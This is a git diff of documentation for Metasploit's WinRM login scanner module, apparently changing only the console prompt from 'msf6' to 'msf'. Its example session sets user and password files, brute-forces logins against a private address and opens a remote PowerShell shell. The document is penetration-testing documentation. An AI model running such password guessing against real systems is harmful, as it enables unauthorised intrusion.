@@ -67,16 +67,16 @@ in `PASSWORD`, and a `PASS_FILE` is listed, passwords will be generated from BOT
 ## Scenarios
 
 ```
-msf6 > use auxiliary/scanner/winrm/winrm_login
-msf6 auxiliary(scanner/winrm/winrm_login) > set user_file ~/users
+msf > use auxiliary/scanner/winrm/winrm_login
+msf auxiliary(scanner/winrm/winrm_login) > set user_file ~/users
 user_file => ~/users
-msf6 auxiliary(scanner/winrm/winrm_login) > set pass_file ~/passes
+msf auxiliary(scanner/winrm/winrm_login) > set pass_file ~/passes
 pass_file => ~/passes
-msf6 auxiliary(scanner/winrm/winrm_login) > set rhosts 192.168.1.205
+msf auxiliary(scanner/winrm/winrm_login) > set rhosts 192.168.1.205
 rhosts => 192.168.1.205
-msf6 auxiliary(scanner/winrm/winrm_login) > set verbose true
+msf auxiliary(scanner/winrm/winrm_login) > set verbose true
 verbose => true
-msf6 auxiliary(scanner/winrm/winrm_login) > run
+msf auxiliary(scanner/winrm/winrm_login) > run
 
 [!] No active DB -- Credential data will not be saved!
 [-] 192.168.1.205: - LOGIN FAILED: WORKSTATION\Administrator:hunter2 (Incorrect: )
@@ -90,7 +90,7 @@ msf6 auxiliary(scanner/winrm/winrm_login) > run
 [-] 192.168.1.205: - LOGIN FAILED: WORKSTATION\Guest:Winte.1.0 (Incorrect: )
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/winrm/winrm_login) > sessions 
+msf auxiliary(scanner/winrm/winrm_login) > sessions 
 
 Active sessions
 ===============
@@ -99,7 +99,7 @@ Active sessions
   --  ----  ----           -----------                 ----------
   1         shell windows  WinRM : (WIN10DEV\smash)  WinRM (192.168.1.205)
 
-msf6 auxiliary(scanner/winrm/winrm_login) > sessions 1
+msf auxiliary(scanner/winrm/winrm_login) > sessions 1
 [*] Starting interaction with 1...
 
 Windows PowerShell
